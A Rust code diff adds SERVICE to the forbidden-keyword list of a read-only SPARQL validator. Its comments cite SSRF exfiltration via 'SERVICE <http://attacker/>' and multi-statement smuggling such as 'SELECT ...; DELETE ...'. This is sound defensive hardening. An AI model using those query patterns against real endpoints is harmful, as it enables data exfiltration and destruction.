@@ -740,8 +740,12 @@ fn validate_read_only_sparql(query: &str) -> Result<(), String> {
     // This is the primary guard: a mutation keyword appearing as a standalone
     // token anywhere in the (comment-stripped) query is rejected, which also
     // catches multi-statement smuggling like `SELECT ...; DELETE ...`.
-    const FORBIDDEN: [&str; 10] = [
+    // SERVICE is a *read* keyword (federated query) but on a public-ish read
+    // endpoint it is an SSRF / data-exfiltration vector (`SELECT … SERVICE
+    // <http://attacker/>`), so it is forbidden here (PRD-020 WS-0 / ADR-117).
+    const FORBIDDEN: [&str; 11] = [
         "INSERT", "DELETE", "DROP", "CLEAR", "LOAD", "CREATE", "ADD", "MOVE", "COPY", "WITH",
+        "SERVICE",
     ];
     for tok in &tokens {
         if FORBIDDEN.contains(tok) {
